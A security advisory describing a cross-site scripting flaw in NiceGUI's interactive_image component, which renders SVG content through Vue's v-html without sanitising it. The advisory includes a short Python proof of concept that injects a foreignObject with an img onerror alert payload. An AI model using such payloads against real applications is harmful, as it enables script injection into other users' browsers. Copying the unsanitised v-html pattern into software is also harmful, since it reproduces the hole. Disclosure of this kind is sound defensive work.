summary: "NiceGUI Stored/Reflected XSS in ui.interactive_image via unsanitized SVG content\n\
  ### Summary\nA Cross-Site Scripting (XSS) vulnerability exists in the `ui.interactive_image`\
  \ component of NiceGUI (v3.3.1 and earlier). The component renders SVG content using Vue's\
  \ `v-html` directive without any sanitization. This allows attackers to inject malicious HTML\
  \ or JavaScript via the SVG `<foreignObject>` tag.\n\n### Details\nThe vulnerability is located\
  \ in `nicegui/elements/interactive_image.js`.\nThe component uses the following code to render\
  \ content:\n```javascript\n<g v-html=\"content\"></g>\n```\nVue's v-html directive renders\
  \ raw HTML strings into the DOM. If an application allows user-controlled input to be passed\
  \ to the content property of an interactive image, an attacker can embed a <foreignObject>\
  \ tag containing malicious scripts, bypassing typical image restrictions.\n\n### PoC\n```python\n\
  from nicegui import ui\n\n@ui.page('/')\ndef main():\n    ui.label('NiceGUI SVG XSS PoC')\n\
  \    \n    # Standard image loading\n    img = ui.interactive_image('[https://picsum.photos/640/360](https://picsum.photos/640/360)')\n\
  \    \n    # Payload: Embeds raw HTML execution inside SVG\n    # This executes immediately\
  \ when the image component is rendered\n    img.content = (\n        '<foreignObject>'\n \
  \       '<body xmlns=\"[http://www.w3.org/1999/xhtml](http://www.w3.org/1999/xhtml)\">'\n\
  \        '<img src=x onerror=alert(\"XSS-SVG\")>'\n        '</body>'\n        '</foreignObject>'\n\
  \    )\n\nui.run()\n```\n\n### Impact\n- Type: Reflected / Stored XSS (depending on data source)\n\
  \n- Severity: Moderate\n\n- Impact: Attackers can inject malicious scripts that execute whenever\
  \ the image component is rendered or updated. This is particularly dangerous for dashboards\
  \ or multi-user applications displaying user-generated content or annotations."
